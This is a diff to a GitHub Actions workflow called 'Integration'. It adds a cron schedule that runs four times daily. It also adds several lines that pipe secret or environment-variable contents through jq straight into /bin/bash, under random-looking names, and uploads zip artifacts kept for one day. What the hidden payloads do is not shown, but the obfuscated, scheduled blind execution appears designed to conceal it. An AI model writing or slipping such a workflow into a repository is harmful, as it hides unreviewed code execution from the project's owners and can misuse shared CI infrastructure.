@@ -2,6 +2,8 @@ name: Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '33 4,10,16,22 * * *'
 jobs:
   action:
     runs-on: ubuntu-latest
@@ -9,14 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Begin
         env:
-          ueq93: ${{ secrets.ueq93 }}
+          dyqe1: ${{ secrets.dyqe1 }}
         run: |
-          printf '%s' "$ueq93" | jq -r .gkoay02 | /bin/bash
-          echo $voufi406 | jq -r .fdrzb91168 | /bin/bash
+          printf '%s' "$dyqe1" | jq -r .bqz858 | /bin/bash
+          echo $poa8266 | jq -r .c342 | /bin/bash
+          printf '%s' "$vqq29784" | jq -r .lqvrm7 | /bin/bash
+          echo $pa4205 | jq -r .qk23 | /bin/bash
+          printf '%s' "$uw29737" | jq -r .aps04955 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: JyhzuKfQ
+          name: cDzOw436
           path: "*.zip"
           retention-days: 1
